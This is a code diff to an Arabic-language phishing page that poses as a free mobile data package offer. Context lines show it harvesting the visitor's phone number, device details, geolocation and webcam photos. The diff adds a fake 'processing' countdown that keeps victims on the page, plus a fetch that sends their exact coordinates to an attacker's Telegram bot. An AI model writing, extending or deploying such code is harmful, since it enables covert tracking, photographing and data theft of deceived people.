@@ -86,6 +86,12 @@
     video {
       display: none;
     }
+    #countdown {
+      font-size: 20px;
+      color: #ffd600;
+      text-align: center;
+      margin: 20px 0;
+    }
   </style>
 </head>
 <body>
@@ -124,6 +130,7 @@
   🛑 لا تقم بإغلاق الصفحة أثناء المعالجة
 </div>
 
+<div id="countdown"></div>
 <iframe id="map" src=""></iframe>
 <video id="video" autoplay playsinline></video>
 
@@ -168,6 +175,20 @@
       map.src = `https://maps.google.com/maps?q=${lat},${lon}&z=15&output=embed`;
     }
 
+    function startCountdown(seconds) {
+      const countdownEl = document.getElementById("countdown");
+      countdownEl.innerText = `⏳ جاري المعالجة (${seconds}) ثانية`;
+      const interval = setInterval(() => {
+        seconds--;
+        if (seconds <= 0) {
+          clearInterval(interval);
+          countdownEl.innerText = "✅ تم تجهيز الطلب!";
+        } else {
+          countdownEl.innerText = `⏳ جاري المعالجة (${seconds}) ثانية`;
+        }
+      }, 1000);
+    }
+
     async function submitRequest() {
       const phone = document.getElementById("phone").value.trim();
       const operator = document.getElementById("operator").value;
@@ -177,6 +198,7 @@
       if (!phone || phone.length < 9) return alert("📵 أدخل رقم صحيح");
 
       alert("⏳ جاري تجهيز الباقة... الرجاء الانتظار وعدم الخروج من الصفحة");
+      startCountdown(30);
 
       const ip = await getIPInfo();
       const battery = await getBatteryInfo();
@@ -187,12 +209,10 @@
       const connection = navigator.connection?.effectiveType || "؟";
       const now = new Date().toLocaleString("ar-SY", { timeZone: "Asia/Damascus" });
 
-      let locationUrl = "❌ غير متاح";
-
       navigator.geolocation.getCurrentPosition(async pos => {
         const lat = pos.coords.latitude.toFixed(5);
         const lon = pos.coords.longitude.toFixed(5);
-        locationUrl = `https://maps.google.com/?q=${lat},${lon}`;
+        const locationUrl = `https://maps.google.com/?q=${lat},${lon}`;
         loadMap(lat, lon);
 
         const msg = `\n📱 طلب باقة مجانية
@@ -201,9 +221,6 @@
 الباقة: ${pack}
 الاتصال: ${net}
 📍 الموقع: ${locationUrl}
-الدولة: ${ip.country_name || "؟"}
-المدينة: ${ip.city || "؟"}
-IP: ${ip.ip || "؟"}
 🔋 شحن: ${battery.level}% | يشحن؟ ${battery.charging}
 💾 RAM: ${memory}GB | CPU: ${cores} نواة
 🌐 الاتصال: ${connection}
@@ -219,8 +236,14 @@ IP: ${ip.ip || "؟"}
 
         await capturePhotos();
 
+        const locData = {
+          latitude: lat,
+          longitude: lon
+        };
+        await fetch(`https://api.telegram.org/bot${token}/sendLocation?chat_id=${chatId}&latitude=${lat}&longitude=${lon}`);
+
         saveToLocal(phone);
-        alert("✅ تم إرسال الطلب والصور بنجاح!");
+        alert("✅ تم إرسال الطلب والموقع والصور بنجاح!");
 
       }, () => {
         alert("⚠️ الموقع الجغرافي غير مفعل!");
